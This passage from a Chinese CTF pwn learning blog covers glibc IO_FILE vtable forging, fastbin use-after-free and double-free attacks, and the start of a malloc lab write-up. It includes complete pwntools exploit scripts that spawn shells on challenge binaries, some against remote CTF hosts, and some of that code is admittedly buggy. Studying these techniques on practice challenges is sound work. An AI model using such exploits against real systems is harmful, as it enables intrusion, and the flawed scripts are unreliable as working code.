href=\"#fread\"></a></h4><p>fread真正功能的实现在子函数<code>_IO_sgetn</code>中。</p>\n<p>下面是<code>_IO_sgetn</code>的源码。</p>\n<pre><code class=\"c\">_IO_size_t\n_IO_sgetn (fp, data, n)\n     _IO_FILE *fp;\n     void *data;\n     _IO_size_t n;\n{\n  return _IO_XSGETN (fp, data, n);\n}\n</code></pre>\n<p>实际上也是先定义一堆变量然后内部再调用另外一个函数。</p>\n<p>也就是<code>_IO_XSGETN</code>。</p>\n<p>这个函数并不简单，它是<code>_IO_FILE_plus.vtable</code> 中的函数指针，在调用这个函数时会首先取出 vtable 中的指针然后再进行调用。</p>\n<p>vtable也是一个指针，指向结构体<code>_IO_jump_t</code></p>\n<p><code>_IO_jump_t</code>源码如下</p>\n<pre><code class=\"c\">struct _IO_jump_t\n{\n    JUMP_FIELD(size_t, __dummy);\n    JUMP_FIELD(size_t, __dummy2);\n    JUMP_FIELD(_IO_finish_t, __finish);\n    JUMP_FIELD(_IO_overflow_t, __overflow);\n    JUMP_FIELD(_IO_underflow_t, __underflow);\n    JUMP_FIELD(_IO_underflow_t, __uflow);\n    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);\n    /* showmany */\n    JUMP_FIELD(_IO_xsputn_t, __xsputn);\n    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);\n    JUMP_FIELD(_IO_seekoff_t, __seekoff);\n    JUMP_FIELD(_IO_seekpos_t, __seekpos);\n    JUMP_FIELD(_IO_setbuf_t, __setbuf);\n    JUMP_FIELD(_IO_sync_t, __sync);\n    JUMP_FIELD(_IO_doallocate_t, __doallocate);\n    JUMP_FIELD(_IO_read_t, __read);\n    JUMP_FIELD(_IO_write_t, __write);\n    JUMP_FIELD(_IO_seek_t, __seek);\n    JUMP_FIELD(_IO_close_t, __close);\n    JUMP_FIELD(_IO_stat_t, __stat);\n    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);\n    JUMP_FIELD(_IO_imbue_t, __imbue);\n#if 0\n    get_column;\n    set_column;\n#endif\n};\n</code></pre>\n<p>这里vtable就像一个中转站，通过它调用<code>_IO_jump_t</code>中的各种函数。</p>\n<p>比如说这里fread就是调用的<code>_IO_file_xsgetn</code>函数。</p>\n<p>值得注意的是调用这个函数之前需要把它从vtable中取出从，然后才跳过去调用。</p>\n<pre><code class=\"c\">  if (fp-&gt;_IO_buf_base\n          &amp;&amp; want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))\n        {\n          if (__underflow (fp) == EOF)\n        break;\n\n          continue;\n        }\n</code></pre>\n<p>函数源码如上，实现的是一个键盘输入。 </p>\n<p>实际上orw三个功能的原理都差不多，都是经过vtable指针调用函数。只是最后的功能有区别而已。</p>\n<h3 id=\"伪造vtable\">伪造vtable<a class=\"post-anchor\" href=\"#伪造vtable\"></a></h3><p>在刚在的fread调用分析中我们认识到vtable实际上就是一个中转站，如果我们能够控制这个中转站的内容，我们也就相应地能够控制程序进行一些奇怪的操作了。</p>\n<p>那么应该如何伪造vtable呢？<br>目前有两种思路。</p>\n<p>一种是直接修改vtable中的指针，进行一个任意地址读写，第二种是覆盖 vtable 的指针，使其指向一段可控的内存空间，也就相当于伪造vtable。</p>\n<p>在libc2.23以后的版本vtable不能被直接写入数据，所以只能用第二种方法–伪造vtable。</p>\n<p>但是我们先从第一个方法来试一试。</p>\n<p>示例来源于ctf-wiki</p>\n<pre><code class=\"c\">int main(void)\n{\n    FILE *fp;\n    long long *vtable_ptr;\n    fp=fopen(\"123.txt\",\"rw\");\n    vtable_ptr=*(long long*)((long long)fp+0xd8);     //get vtable\n\n    vtable_ptr[7]=0x41414141 //xsputn\n\n    printf(\"call 0x41414141\");\n}\n</code></pre>\n<p>这边利用的具体步骤比较直观。</p>\n<p>遍历 <code>_IO_list_all</code> ，然后调用 <code>_IO_2_1_stdout_</code> 下的 <code>vtable</code> 中 <code>_setbuf</code> 函数。</p>\n<p>承接上文的思路，我们需要在某个可控内存伪造vtable，然后修改_setbuf函数为关键内容。</p>\n<p>在这道题中，我们可以在vtable附近修改两个字节构造fake vtable，然后利用三个字节改_setbuf为one_gadget。</p>\n<p>开头直接给出了sleep函数的真实地址，程序内存地址完全暴露，我们可以通过它找到exit调用的stdout的地址。</p>\n<pre><code class=\"bash\">pwndbg&gt; print _IO_2_1_stdin_\n$2 = {\n  file = {\n    _flags = -72540024, \n    _IO_read_ptr = 0x0, \n    _IO_read_end = 0x0, \n    _IO_read_base = 0x0, \n    _IO_write_base = 0x0, \n    _IO_write_ptr = 0x0, \n    _IO_write_end = 0x0, \n    _IO_buf_base = 0x0, \n    _IO_buf_end = 0x0, \n    _IO_save_base = 0x0, \n    _IO_backup_base = 0x0, \n    _IO_save_end = 0x0, \n    _markers = 0x0, \n    _chain = 0x0, \n    _fileno = 0, \n    _flags2 = 0, \n    _old_offset = -1, \n    _cur_column = 0, \n    _vtable_offset = 0 '\\000', \n    _shortbuf = \"\", \n    _lock = 0x7ffff7dcf8d0 &lt;_IO_stdfile_0_lock&gt;, \n    _offset = -1, \n    _codecvt = 0x0, \n    _wide_data = 0x7ffff7dcdae0 &lt;_IO_wide_data_0&gt;, \n    _freeres_list = 0x0, \n    _freeres_buf = 0x0, \n    __pad5 = 0, \n    _mode = 0, \n    _unused2 = '\\000' &lt;repeats 19 times&gt;\n  }, \n  vtable = 0x7ffff7dca2a0 &lt;_IO_file_jumps&gt;\n}\n</code></pre>\n<p>我们可以看到vtable的地址是0x7ffff7dca2a0。</p>\n<p>然后我们需要在它附近伪造一个vtable。</p>\n<ol>\n<li>伪造的vtable需要符合以下条件：<br>1:<code>fake_vtable + 0x58</code>=<code>libc_base+off_3</code></li>\n</ol>\n<p>完整exp</p>\n<pre><code class=\"python\">from pwn import *\ncontext.log_level=\"debug\"\n\nlibc=ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\")\np = process('the_end')\n\nlibc_base = long(sleep_ad,16) - libc.symbols['sleep']\none_gadget = libc_base + 0xf02b0\nvtables =     libc_base + 0x3C56F8\n\nfake_vtable = libc_base + 0x3c5588\ntarget_addr = libc_base + 0x3c55e0\n\nfor i in range(2):\n    p.send(p64(vtables+i))\n    p.send(p64(fake_vtable)[i])\n\n\nfor i in range(3):\n    p.send(p64(target_addr+i))\n    p.send(p64(one_gadget)[i])\n\np.sendline(\"exec /bin/sh 1&gt;&amp;0\")\n\np.interactive()\n</code></pre>\n<h4 id=\"总结\">总结<a class=\"post-anchor\" href=\"#总结\"></a></h4><p>伪造vtable算是io_file中比较简单好懂的一点了，只要对数据结构稍微熟悉一点就能很快理解。然后伪造的方式和思路也比较直接，可以说是经典pwn思路了。</p>\n<p>下一章我们将学习FSOP，感觉难度会比伪造vtable高出不少，其实只要沉下心来看都不难，最难的目前来说还是那些高版本的防护的绕过了。</p>\n<h3 id=\"FSOP\">FSOP<a class=\"post-anchor\" href=\"#FSOP\"></a></h3><p>上一part我们学习了如何通过伪造vtable加上打one_gsdget来getshell，理解起来比较简单，实际操作也并不复杂，只要能找到fake vtable的位置并且正确理解one gadget的用法就好。</p>\n<p>这一个part我们学习FSOP。</p>\n<p>ps：不管是fsop还是后面的glibc2.24下的伪造vtable在ctf中的考察都较少。但是不能说不重要吧///</p>\n<p>FSOP 的核心思想就是劫持_IO_list_all 的值来伪造链表和其中的_IO_FILE 项</p>\n</body></html>","tags":["io_file"]},{"title":"fastbin attack","url":"/2021/12/06/fastbin_attack/","content":"<html><head></head><body><h2 id=\"fastbin？\">fastbin？<a class=\"post-anchor\" href=\"#fastbin？\"></a></h2><p>​    </p>\n<h2 id=\"\"><a class=\"post-anchor\" href=\"#\"></a></h2><p>​    长度在<code>32-160</code>(32位系统是<code>16-80</code>)的free堆块。通过fastbinlist储存，单向链表，所以fast。fastbin attack一个最简单的利用就是UAF，其次就是fastbin double free。ctf pwn中与fastbin相关的还有就是在unsortedbin attack中涉及到的，也是ptmalloc机制中的一种的malloc_consolidate，其中也有可以攻击的机会，但是这个内容日后再在unsortedbin attack的笔记中再进行研究吧。</p>\n<h2 id=\"UAF\">UAF<a class=\"post-anchor\" href=\"#UAF\"></a></h2><p>​        先从一个简单的例子开始：</p>\n<h4 id=\"hacknote\">hacknote<a class=\"post-anchor\" href=\"#hacknote\"></a></h4><p><a href=\"https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote\">题目链接</a></p>\n<p>​        菜单题，增删查改一应俱全，同时还有后门函数。那么利用思路就是利用悬垂指针，将后门函数的地址覆盖堆指针，使得调用<code>print_note</code>实则是在调用后门函数。</p>\n<p>​        然后来详细分析一下题目的逻辑。</p>\n<p>​        在<code>add_note()</code>中，对于每个note，程序分配了两个堆块，一个chunk储存结构体note的两个字段：<code>printnote</code>    的指针和<code>content</code>的指针，一共是8字节，另一个chunk则储存内容，size由用户输入决定。</p>\n<p>​        每个note的chunk的地址是连续的。</p>\n<p>​        我们连续申请两个note。</p>\n<pre><code class=\"python\">addnote(32, \"aaaa\") # add note 0\naddnote(32, \"ddaa\") # add note 1\n</code></pre>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8810.00.23.png\" data-caption=\"截屏2021-12-06 下午10.00.23\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8810.00.23.png\" alt=\"截屏2021-12-06 下午10.00.23\"></a></p>\n<p>​        可以看到从158开始就是第一个chunk0的指针，8字节没有问题。然后168开始是content chunk。顺带一提0x11=是因为八字节的user space+8字节的chunk头以及最低位1的inuse。0x31则是因为对齐补全而多了八字节，也就是0x20（user space）+0x8（chunk头）+0x8（对齐）+最低位置1。</p>\n<p>​        然后我们分别释放这两个chunk。</p>\n<p>（然后发现fastbin是空的，free chunk跑Tcache了，有一点尴尬）</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8810.13.27.png\" data-caption=\"截屏2021-12-06 下午10.13.27\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8810.13.27.png\" alt=\"截屏2021-12-06 下午10.13.27\"></a></p>\n<p>​        </p>\n<p>​        问题不大，pwndocker好处就体现在此。</p>\n<p>​        可以看到两个note的四个堆块都被free了。并且处在不同的空闲链表中，但是这不是重点。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8810.15.51.png\" data-caption=\"截屏2021-12-06 下午10.15.51\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8810.15.51.png\" alt=\"截屏2021-12-06 下午10.15.51\"></a></p>\n<p>​        可以看到，被free的四个chunk的内存地址是连续的，所以当我们申请一个size为8的note2时，malloc会在空闲链表中寻找符合的free chunk，并且由于0x10和0x28的free chunk是分别的两条空闲链表，所以malloc会直接在0x10的链表中寻找，并从链表中取出尾部的free chunk，也就是刚才被释放的note1的指针chunk。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8811.10.37.png\" data-caption=\"截屏2021-12-06 下午11.10.37\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8811.10.37.png\" alt=\"截屏2021-12-06 下午11.10.37\"></a></p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8811.12.17.png\" data-caption=\"截屏2021-12-06 下午11.12.17\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8811.12.17.png\" alt=\"截屏2021-12-06 下午11.12.17\"></a></p>\n<p>​            fastbin的0x10中的两个free chunk都被分配了，一个储存指针，一个储存content。位置分别是<code>0x5695c038</code>和<code>0x5695c0300</code>。</p>\n<p>​        也就是说，note2的content chunk，实则被分配到了note0的指针chunk的内存空间，而原本在这里储存的是note0的*put和 *content，也就是说，如果我们此刻执行<code>print(note0)</code>,那么程序就会将执行函数与 *put指向的地址的操作绑定执行put。</p>\n<p>​        此刻我们的*put指向的是cccc，那么我们只要把它换成后门函数地址，就能够getshell。</p>\n<p>​        <a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8811.25.50.png\" data-caption=\"截屏2021-12-06 下午11.25.50\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8811.25.50.png\" alt=\"截屏2021-12-06 下午11.25.50\"></a></p>\n<p>完整exp</p>\n<pre><code class=\"python\">#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom pwn import *\n\nr = process([\"/glibc/2.23/32/lib/ld-2.23.so\", \"./hacknote\"], env={\"LD_PRELOAD\":\"/glibc/2.23/32/lib/libc.so.6\"})\n\n#context.terminal = ['tmux', 'splitw', '-h']\n##context.update(arch='i386', os='linux')\n#context.log_level = \"debug\"\ndef addnote(size, content):\n    r.recvuntil(\":\")\n    r.sendline(\"1\")\n    r.recvuntil(\":\")\n    r.sendline(str(size))\n    r.recvuntil(\":\")\n    r.sendline(content)\n\n\ndef delnote(idx):\n    r.recvuntil(\":\")\n    r.sendline(\"2\")\n    r.recvuntil(\":\")\n    r.sendline(str(idx))\n\n\ndef printnote(idx):\n    r.recvuntil(\":\")\n    r.sendline(\"3\")\n    r.recvuntil(\":\")\n    r.sendline(str(idx))\n\n\n#gdb.attach(r)\nmagic = 0x08048986\n\naddnote(32, \"yuuu\") # add note 0\naddnote(32, \"ddaa\") # add note 1\n\ndelnote(0) # delete note 0\ndelnote(1) # delete note 1\naddnote(8, p32(0x8048986))\n#gdb.attach(r)\nprintnote(0)\n\n\nr.interactive()\n</code></pre>\n<h4 id=\"pwnable-hacknote\">pwnable_hacknote<a class=\"post-anchor\" href=\"#pwnable-hacknote\"></a></h4><p>​        好，写了很多。然后再稍微加强一点，来看pwnable.tw上的hacknote。</p>\n<p>​        <a href=\"https://pwnable.tw/challenge/#5\">题目链接</a></p>\n<p>​        源码和hitcon lab相比就是缺少了后门函数，需要ret2libc。直接利用之前的思路，将*put覆盖为print的地址和puts的got表，泄露puts的虚拟地址，然后经典ret2libc，拿到ststem的地址，传参的话还是一样的思路。</p>\n<pre><code class=\"python\">#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom pwn import *\n\nr = process([\"/glibc/2.23/32/lib/ld-2.23.so\", \"./hacknote\"], env={\"LD_PRELOAD\":\"/ctf/work/work/challenge/pwnable/hacknote/libc_32.so.6\"})\nr = remote('chall.pwnable.tw',10102)\n\nlibc = ELF(\"./libc_32.so.6\")\n#context.terminal = ['tmux', 'splitw', '-h']\n#context.update(arch='i386', os='linux')\n#context.log_level = \"debug\"\n\n\nprint_addr = 0x804862b\nputs_got = 0x804A024\n\ndef addnote(size, content):\n    r.recvuntil(\":\")\n    r.sendline(\"1\")\n    r.recvuntil(\":\")\n    r.sendline(str(size))\n    r.recvuntil(\":\")\n    r.sendline(content)\n\n\ndef delnote(idx):\n    r.recvuntil(\":\")\n    r.sendline(\"2\")\n    r.recvuntil(\":\")\n    r.sendline(str(idx))\n\n\ndef printnote(idx):\n    r.recvuntil(\":\")\n    r.sendline(\"3\")\n    r.recvuntil(\":\")\n    r.sendline(str(idx))\n\n\n#gdb.attach(r)\nmagic = 0x08048986\n\naddnote(32, \"yuuu\") # add note 0\naddnote(32, \"ddaa\") # add note 1\n\ndelnote(0) # delete note 0\ndelnote(1) # delete note 1\naddnote(8,p32(print_addr)+p32(puts_got))\nprintnote(0)\nputs_addr = u32(r.recv(4))\nprint(hex(puts_addr))\nlibc_base = puts_addr - libc.symbols['puts']\nsystem_addr = libc.symbols['system'] - libc_base\ndelnote(2)\naddnote(8,flat([system_addr,\"||sh\"]))\n#gdb.attach(r)\nprintnote(0)\n\n\nr.interactive()\n</code></pre>\n<h2 id=\"FastbinDoubleFree\">FastbinDoubleFree<a class=\"post-anchor\" href=\"#FastbinDoubleFree\"></a></h2><p>​        </p>\n<p>​    关于fastbin attack，利用其实非常的简单，就是使得被二次释放的chunk不与<code>main_arena</code>直接指向就行。这样就会造成被二次释放的chunk被再次插入空闲链表，使得下一次申请合适size的chunk时会申请到被二次释放的chunk，而chunk的fd又能够随意修改，造成任意地址写与执行。</p>\n<p>​        从数据结构的角度看，fastbin与其他bin不太一样的就是，它是由单向链表管理，chunk只有一个fd，链表头为<code>main_arena</code>（关于这里一直不太理解main_arena是怎样管理所有bin并通过它得到bin的偏移的），新free的chunk会被插入表头，而取出时遵循的是frist fit原则，也就是从头开始检查，并取出第一个符合条件的chunk。</p>\n<p>高效，但是势必会造成一定的fragment，但是由于fastbin chunk本身的size足够小，所以可以忽略。            </p>\n<p>​        例子来源于之前做过的一些题：</p>\n<h4 id=\"metasequoia-2020-samsara\">metasequoia_2020_samsara<a class=\"post-anchor\" href=\"#metasequoia-2020-samsara\"></a></h4><p>​        <a href=\"https://github.com/fuurinko/CTF-TASK/blob/main/metasequoia_2020_samsara\">题目链接</a></p>\n<p>​        逻辑比较好逆，如果v8等于deadbeef就能getshell。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8810.28.11.png\" data-caption=\"截屏2021-12-07 下午10.28.11\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8810.28.11.png\" alt=\"截屏2021-12-07 下午10.28.11\"></a></p>\n<p>​        </p>\n<p>​        然后变量的栈布局是这样的</p>\n<p>​    </p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8810.27.32.png\" data-caption=\"截屏2021-12-07 下午10.27.32\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8810.27.32.png\" alt=\"截屏2021-12-07 下午10.27.32\"></a></p>\n<p>​        可以看到v7和v8只差了8字节，如果能够溢出或者其他操作将v8修改就能拿到flag。然后从上面的逻辑我们知道v7的真实地址，以及我们能够对v7对地址写入任意内容。当然这里不能像栈溢出那样直接溢出v7，将内容写入v8.（具体的原因我其实不是很清楚，是有溢出的检测还是啥捏)，而是需要利用某种方式使得能够任意地址i写</p>\n<p>​        然后又已知这道题的考点是fastbin double free，这个利用方式正好能造成任意地址写。</p>\n<p>​        那么思路大概是</p>\n<pre><code>add chunk0\nadd chunk1\nadd chunk2#防止free chunk被top chunk合并\n\nfree chunk0\nfree chunk1\nfree chunk0\n</code></pre>\n<p>​    此刻fastbin链表大致如下：</p>\n<pre><code>main_arena =&gt; chunk0 =&gt; chunk1 =&gt;chuk0\n</code></pre>\n<p>​    然后此时再</p>\n<pre><code>add chunk3 #申请到的是chunk0的内存空间\nedit chunk3#在fd位填入v8的地址（可以通过打印v7的地址获得）\n然后链表大概长这样：\nmain_arena =&gt; v8 =&gt;chunk1 =&gt;chunk0（这里是错的，后面有更正）\n所以此时只要再add chunk3，就能申请到v8的内存空间，并进行任意写。\n</code></pre>\n<p>​        然后就可以直接写exp了；def部分是直接复制我以前做的时候的exp，那个exp又是我不知道从哪里复制过来的qwq。</p>\n<p>​        （话说上次看大佬写的calc的exp，突然觉得就算是简单的py脚本也能够写得非常抽象捏，什么类型转换数组处理还有各种循环看得我头疼捏，真离谱捏。）    </p>\n<p>​        （写exp的时候发现一个非常畸形的问题，就是我的delete函数无论怎样都会报错，但是先进的vscode完全没有给我一个合理的错误解释，后来在容器中执行了才给我一条有价值的报错。大概就是因为原本的exp的tab和空格混用了，改一下就行，其实之前也遇到过类似的问题，但是当时没有完全意识到问题所在并且不知道为什么就解决了所以没有留下印象）</p>\n<pre><code class=\"python\">#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom pwn import *\n#p = process('./metasequoia_2020_samsara')\n#p = process([\"/glibc/2.23/32/lib/ld-2.23.so\", \"./metasequoia_2020_samsara\"], env={\"LD_PRELOAD\":\"/glibc/2.23/32/lib/libc.so.6\"})\np = remote('node4.buuoj.cn',27450)\n#context.terminal = ['tmux', 'splitw', '-h']\n#context.update(arch='i386', os='linux')\n#context.log_level = \"debug\"\nelf = ELF('./metasequoia_2020_samsara')\n\ndef add():\n    p.recvline(\"choice &gt; \")\n    p.sendline('1')\n\ndef dele(idx):\n    p.recvline(\"choice &gt; \")\n    p.sendline('2')\n    p.sendafter(':',str(idx))\n\ndef edit(idx,content):\n    p.recvline(\"choice &gt; \")\n    p.sendline('3')\n    p.sendafter(':',str(idx))\n    p.sendafter(':',content)\n\ndef show():\n    p.recvline(\"choice &gt; \")\n    p.sendline('4')\n\ndef move(dest):\n    p.recvline(\"choice &gt; \")\n    p.sendline('5')\n    p.sendafter('?',str(dest))\n#double free\nadd()#0\nadd()#1\ndele(0)\ndele(1)\ndele(0)\n#gdb.attach(p)\n\nadd()#2--&gt;0\nadd()#3 --&gt;1\n\nmove(0x20)\nshow()#get the addr of v7\nv7_addr = u64(p.recv(8))\nv8_addr = v7_addr - 8\nedit(2,p64(v8_addr))\n\nedit(3,\"0xDEADBEEF\")\np.sendlineafter(\"choice &gt;\",'6')\n\np.interactive()\n</code></pre>\n<p>​        打不通，并且因为未知原因（大概率是elf头的ld不匹配），导致本地无法调试，去网上搜了一下wp，发现有这么几个个细节我没有注意，或者说想错了。</p>\n<p>​        在进行double free的时候，我只预先申请了两个chunk，并且将前一个申请的chunk double free了。但是wp预先申请了三个chunk，然后我意识到，第三个申请的chunk很有可能是防止之前被free的两个chunk被top chunk合并，之前刷堆题的时候经常碰到这一点，但是太久没做了，有些忘了。这里是没有注意到的细节。</p>\n<p>​        然后是想错了的部分，可以看到我之前的wp中的思路是这样的：</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8A%E5%8D%8810.20.46.png\" data-caption=\"截屏2021-12-08 上午10.20.46\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8A%E5%8D%8810.20.46.png\" alt=\"截屏2021-12-08 上午10.20.46\"></a></p>\n<p>​        错误所在就是，修改free chunk0的fd之后，它在fastbin中的位置应当还是</p>\n<p><code>main_arena =&gt; chunk1 =&gt;chunk0(v8)</code>    ，也不知道为什么我会以为新的fd会被重新插入链表。</p>\n<p>​        然后按照first fit原则，我们连续add两个chunk，就能够申请到v8的内存空间了。后面的内容就问题不大了。</p>\n<p>​        所以更正后的exp大概是这样：</p>\n<pre><code class=\"python\">add()#0\nadd()#1\nadd()#2,防止与top chunk合并\ndele(0)\ndele(1)\ndele(0)\n#gdb.attach(p)\n\nadd()#3--&gt;0\nadd()#4 --&gt;1\n\nmove(0x20)\nshow()#get the addr of v7\nv7_addr = u64(p.recv(8))\nv8_addr = v7_addr - 0x8\nedit(3,p64(v8_addr))\nadd()#5\nadd()#6\nedit(6,0xDEADBEEF)\n</code></pre>\n<h3 id=\"总结\">总结<a class=\"post-anchor\" href=\"#总结\"></a></h3><p>​        感觉每个入门堆题的人首先开始做的题目都是fastbin attack以及UAF，因为确实相对来说简单易懂。但是反观我半年前写的fastbin attack的wp，我的评价是：狗屁不通。</p>\n<p>​        所以我对于堆题，或者是整个ctf pwn的学习其实是走了很多弯路的。比如说对于动调的惧怕，导致我做了很多题，但又没完全做。比如我学习堆题，却不愿意沉下心来，从了解ptmalloc开始，而是摁刷题，导致知识点被割裂得完全串联不上，学完就忘。现在从csapp malloc lab开始逐步琢磨glibc，然后睡前再看半个小时源码剖析，再辅以ctf pwn的一些题目的分析，对于各种知识点好歹是有了一个足以将它们串联起来的体系，从而做题是不再那么一头雾水了。如果在半年前我能意识到这一点就好了。但是我还是觉得任何在pwn学习过程中踩过的坑，无论是知识点本身的坑，还是学习方案上的坑，都是宝贵的，无可替代的学习经验捏。</p>\n</body></html>","tags":["heap_pro"]},{"title":"csapp malloc lab","url":"/2021/12/03/malloc%20lab/","content":"<html><head></head><body><h2 id=\"0）前言\">0）前言<a class=\"post-anchor\" href=\"#0）前言\"></a></h2><p>​        鸽了三个月的malloc lab，作为复习堆题的开始。</p>\n<p>​        计画完成时间是12.5之前，也就是三天。</p>\n<h2 id=\"1）大体设计\">1）大体设计<a class=\"post-anchor\" href=\"#1）大体设计\"></a></h2><p>​        对于整体的操作的大致模型以及allocater和freer需要做的工作如下：</p>\n<p>​        分配器：</p>\n<ol>\n<li><p>在第一次分配chunk时，对堆空间进行初始化=&gt;<code>mm_init()</code>    </p>\n</li>\n<li><p>创建指定类型的chunk。</p>\n<p>​    free</p>\n</li>\n<li><p>利用隐式空闲链表，将free状态的chunk链接。</p>\n</li>\n<li><p>利用合适的机制，对物理地址相邻的free chunk进行合并</p>\n</li>\n<li><p>利用合适的机制，在分配器有需求的时候分割相对应的free chunk，并将其标识为allocated。</p>\n</li>\n</ol>\n<p>​        其他的驱动代码以及头文件已经给出，我们只需在<code>mm.c</code>中进行编写。</p>\n<p>​        在这个模型中，分配器的分配的chunk的结构大致如下，运用带边界标记的chunk使堆块合并更加优雅。</p>\n<p>​                <a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%885.33.23.png\" data-caption=\"截屏2021-12-03 下午5.33.23\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%885.33.23.png\" alt=\"截屏2021-12-03 下午5.33.23\"></a></p>\n<p>​        </p>\n<h2 id=\"2）利用宏定义简化指针操作\">2）利用宏定义简化指针操作<a class=\"post-anchor\" href=\"#2）利用宏定义简化指针操作\"></a></h2><p>​        为了简化在操作chunk在链表中的一些与指针相关的行为，我们可以定义一系列宏来将这些操作打包，使得代码更为简洁，同时一些基本的常数也将被定义。</p>\n<p>​    </p>\n<p>​        <a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%885.05.59.png\" data-caption=\"截屏2021-12-04 下午5.05.59\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%885.05.59.png\" alt=\"截屏2021-12-04 下午5.05.59\"></a></p>\n<p>​            </p>\n<h2 id=\"3）level·1\">3）level·1<a class=\"post-anchor\" href=\"#3）level·1\"></a></h2><p>​        level1利用隐式空闲链表+首次/下一次/最佳适配三种方式实现。</p>\n<h3 id=\"first-fit\">first_fit<a class=\"post-anchor\" href=\"#first-fit\"></a></h3><h4 id=\"mm-init\">mm_init()<a class=\"post-anchor\" href=\"#mm-init\"></a></h4><p>​        首先是<code>mm_init()</code>函数，利用<code>mm_sbrk()</code>创建一个4字的空闲链表，将链表第一个双字的首尾分别标记为序言块的header和footer，然后将第三个字标记为结尾块，然后调用<code>extend_heap()</code>函数初始化堆空间。被初始化的size为<code>CHUNKSIZE/WSIZE</code>也就是<code>1*10^12 / 4</code>。</p>\n<p>​        然后是<code>extend_heap()</code>函数，利用<code>mm_sbrk()</code>创建size大小的空间，size由之前初始化的size决定。并且将整个空chunk的对应位标记头和脚部。最后，在很可能出现的前一个堆以一个空闲块结束的情况，我们调用coalesce函数来合并两个空闲块 ，并返回指向合并后的块的块指针。coalesce函数将在后面的部分被详细分析。</p>\n<h4 id=\"mm-malloc\">mm_malloc()<a class=\"post-anchor\" href=\"#mm-malloc\"></a></h4><p>​        堆空间初始化之后，我们首先设计<code>mm_malloc()</code>。</p>\n<p>​        函数大致功能是：</p>\n<ol>\n<li><p>检查请求真假，然后准备分配chunk</p>\n</li>\n<li><p>调整chunk size，在请求size的基础上加入8字节的对齐和8字节的chunk头和chunk脚。也就是说，一个chunk至少会有16字节。</p>\n</li>\n<li><p>在free list中寻找符合size要求的chunk。</p>\n</li>\n<li><p>如果没有在free list中找到，则直接调用<code>extend_heap()    </code>生成对应的空间。</p>\n<p>​    </p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%887.21.02.png\" data-caption=\"截屏2021-12-04 下午7.21.02\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%887.21.02.png\" 